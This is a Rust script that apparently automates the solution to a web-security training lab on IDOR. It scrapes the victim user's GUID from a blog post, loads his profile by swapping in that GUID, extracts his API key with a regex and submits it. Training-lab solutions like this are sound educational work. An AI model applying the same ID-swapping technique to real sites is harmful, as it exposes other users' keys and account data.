/******************************************************************************
*
* Lab: User ID controlled by request parameter, with unpredictable user IDs
*
* Hack Steps: 
*      1. Fetch a post published by carlos
*      2. Extract the GUID of carlos from the response body
*      3. Fetch carlos profile using his GUID
*      4. Extract the API key from the response body
*      5. Submit the solution
*
*******************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a830011041297c7804462b5001b0096.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching a post published by carlos.. ");
    flush_terminal();

    let post_page = fetch("/post?postId=3"); // Change the postId to that of Carlos's post because it may vary

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the GUID of carlos from the response body.. ");
    flush_terminal();

    let page_content = post_page.text().unwrap();
    let carlos_guid = capture_pattern_from_text("userId=(.*)'>carlos", &page_content);

    println!("{}", "OK".green());
    print!("⦗3⦘ Fetching carlos profile page.. ");
    flush_terminal();

    let carlos_profile = fetch(&format!("/my-account?id={carlos_guid}"));

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the API key from the response body.. ");
    flush_terminal();

    let body = carlos_profile.text().unwrap();
    let api_key = capture_pattern_from_text("Your API Key is: (.*)</div>", &body);

    println!("{}", "OK".green());
    print!("⦗5⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&api_key);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
